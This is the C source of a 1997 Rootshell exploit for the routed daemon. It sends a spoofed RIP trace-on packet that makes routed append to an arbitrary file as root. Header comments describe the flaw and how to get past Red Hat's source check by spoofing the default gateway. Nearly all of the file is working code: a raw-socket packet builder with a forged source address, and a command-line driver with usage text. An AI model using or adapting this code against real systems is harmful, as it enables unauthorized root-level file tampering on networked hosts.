/*
 * BSD 4.4 based routed trace file exploit
 *
 * (C) 1997 Rootshell [ http://www.rootshell.com/ ]
 *
 * <info@rootshell.com>
 *
 * routed has the ability for a packet to be sent to the daemon that will
 * turn on debug mode.  The packet is able to specify the file which is
 * later opened without any checks being placed on that file open.
 *
 * Result: You can append to any file on the filesystem.
 *
 * The following syscall is made AS ROOT.
 *
 * ftrace = fopen(file, "a");
 *
 * This is obviously a LARGE problem.
 *
 * Solaris 2.6 seems to ignore these packets and returns the following
 * error.  Mileage may vary.. :
 *
 * in.routed[6580]: trace command from 1.2.3.4 - ignored
 *
 * Redhat routed was tested and found to check if the packet came from
 * a valid router.  If you spoof the RIP packet from their default
 * gateway the packet is ACCEPTED.
 *
 * Note: Once a trace file is opened you must close the trace file and then
 * open another file.
 *
 * Exploit tested under Linux 2.0.x.
 *
 * ps.  Just run gated! (http://www.gated.org/)
 *
 */


/* File to append to on filesystem with debug output */

#define FILETOCREATE	"/tmp/rootshell"


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_tcp.h>
#include <linux/udp.h>
#include <netinet/protocols.h>
#include <netdb.h>
#include <protocols/routed.h>
#include <linux/route.h>

#define err(x) { fprintf(stderr, x); exit(1); }
#define errs(x, y) { fprintf(stderr, x, y); exit(1); }

/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

/* Send faked UDP packet. */
int sendpkt_udp(sin, s, data, datalen, saddr, daddr, sport, dport)
struct sockaddr_in *sin;
unsigned short int s, datalen, sport, dport;
unsigned long  int saddr, daddr;
char *data;
{  
  struct iphdr  ip;
  struct udphdr udp;
  static char packet[8192];

  /* Fill in IP header values. */
  ip.ihl      = 5;
  ip.version  = 4;
  ip.tos      = 0;
  ip.tot_len  = htons(28 + datalen);
  ip.id       = htons(31337 + (rand()%100));
  ip.frag_off = 0;
  ip.ttl      = 255;
  ip.protocol = IPPROTO_UDP;
  ip.check    = 0;
  ip.saddr    = saddr;
  ip.daddr    = daddr;
  ip.check    = in_cksum((char *)&ip, sizeof(ip));

  /* Fill in UDP header values. Checksums are unnecassary. */
  udp.source = htons(sport);
  udp.dest   = htons(dport);
  udp.len    = htons(8 + datalen);
  udp.check  = (short) 0;

  /* Copy the headers into our character array. */
  memcpy(packet, (char *)&ip, sizeof(ip));
  memcpy(packet+sizeof(ip), (char *)&udp, sizeof(udp));
  memcpy(packet+sizeof(ip)+sizeof(udp), (char *)data, datalen);

  return(sendto(s, packet, sizeof(ip)+sizeof(udp)+datalen, 0,
         (struct sockaddr *)sin, sizeof(struct sockaddr_in)));
}

/* Lookup the name. Also handles a.b.c.d dotted quads. Returns 0 on error */
unsigned int lookup(host)
char *host;
{
  unsigned int addr;
  struct hostent *he;

  addr = inet_addr(host);	/* Try if it's a "127.0.0.1" style string */
  if (addr == -1) 		/* If not, lookup the host */
  {
    he = gethostbyname(host);
    if ((he == NULL) || (he->h_name == NULL) || (he->h_addr_list == NULL))
      return 0;

    bcopy(*(he->h_addr_list), &(addr), sizeof(he->h_addr_list));
  }
  return(addr);
}

void
main(argc, argv)
int argc; char **argv;
{
  unsigned int saddr, daddr;
  struct sockaddr_in sin;
  int s;
  struct rip rp;

  if(argc != 4)
    errs("\nSee http://www.rootshell.com/\n\nUsage: %s <source_router> <dest_addr> <command>\n\ncommand: 3 = trace on, 4 =
trace off\n\n",argv[0]);

  if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    err("Unable to open raw socket.\n");

  if(!(saddr = lookup(argv[1])))
    err("Unable to lookup source address.\n");
  if(!(daddr = lookup(argv[2])))
    err("Unable to lookup destination address.\n");

  sin.sin_family     = AF_INET;
  sin.sin_addr.s_addr= daddr;
  sin.sin_port       = 520;

  /* Fill in RIP packet info */
  rp.rip_cmd = atoi(argv[3]); /* 3 = RIPCMD_TRACEON, 4 = RIPCMD_TRACEOFF */
  rp.rip_vers = RIPVERSION; /* Must be version 1 */
  sprintf(rp.rip_tracefile, FILETOCREATE);

  if((sendpkt_udp(&sin, s, &rp, sizeof(rp), saddr, daddr, 520, 520)) == -1)
  {
    perror("sendpkt_udp");
    err("Error sending the UDP packet.\n");
  }
}
